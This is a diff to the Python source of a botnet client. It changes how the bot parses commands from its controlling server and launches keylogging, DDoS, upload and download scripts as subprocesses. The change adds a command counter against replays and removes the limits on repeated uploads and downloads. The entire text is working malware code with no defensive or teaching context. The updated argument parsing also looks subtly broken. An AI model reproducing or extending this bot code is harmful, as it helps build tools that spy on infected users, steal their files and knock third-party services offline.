@@ -32,6 +32,7 @@ class botnode:
 		self.ip = ip
 		self.port = port
 		self.id = network_id
+		self.cmdcnt = 0
 		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging). Might need to do something with them later
 		self.pgroup = []
 		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
@@ -56,8 +57,10 @@ def get_cmd(value,server,bot):
 	commands = ['DDOS','DOWNLOAD','KEYLOG','UPLOAD']
 	try:
 		x = value.split()
-		cmd = x[0]
-		if cmd in commands:
+		cnt = int(x[0]) #parse out the command count
+		cmd = x[1]
+		if cmd in commands and cnt > bot.cmdcnt:
+			bot.cmdcnt += 1
 			if cmd == 'KEYLOG':
 				if bot.cmdsrun['KEYLOG'] is False:
 					tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
@@ -72,20 +75,21 @@ def get_cmd(value,server,bot):
 					process=subprocess.Popen(tmp.split(),shell=False)
 					bot.cmdsrun['DDOS'] = True
 			if cmd == 'UPLOAD':
-				if bot.cmdsrun['UPLOAD'] is False:
-					tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
-					print "Starting upload on {0}".format(tmp)
-					process=subprocess.Popen(tmp.split(),shell=False)
-					bot.cmdsrun['UPLOAD'] = True
+				#if bot.cmdsrun['UPLOAD'] is False:
+				tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
+				print "Starting upload on {0}".format(tmp)
+				process=subprocess.Popen(tmp.split(),shell=False)
+					#bot.cmdsrun['UPLOAD'] = True
 			if cmd == 'DOWNLOAD':
-				if bot.cmdsrun['DOWNLOAD'] is False:
-					tmp = 'python download.py {0}'.format(' '.join(x[1:]))
-					print "Starting DOWNLOAD on {0}".format(tmp)
-					process=subprocess.Popen(tmp.split(),shell=False)
-					bot.cmdsrun['DOWNLOAD'] = True
+				#if bot.cmdsrun['DOWNLOAD'] is False:
+				tmp = 'python download.py {0}'.format(' '.join(x[1:]))
+				print "Starting DOWNLOAD on {0}".format(tmp)
+				process=subprocess.Popen(tmp.split(),shell=False)
+
+					#bot.cmdsrun['DOWNLOAD'] = True
 			#can add any arbitrary command we want
-			else:
-				print 'Feel free to implement your own commands!'
+			#else:
+				#print 'Feel free to implement your own commands!'
 
 	except Exception, e:
 		pass
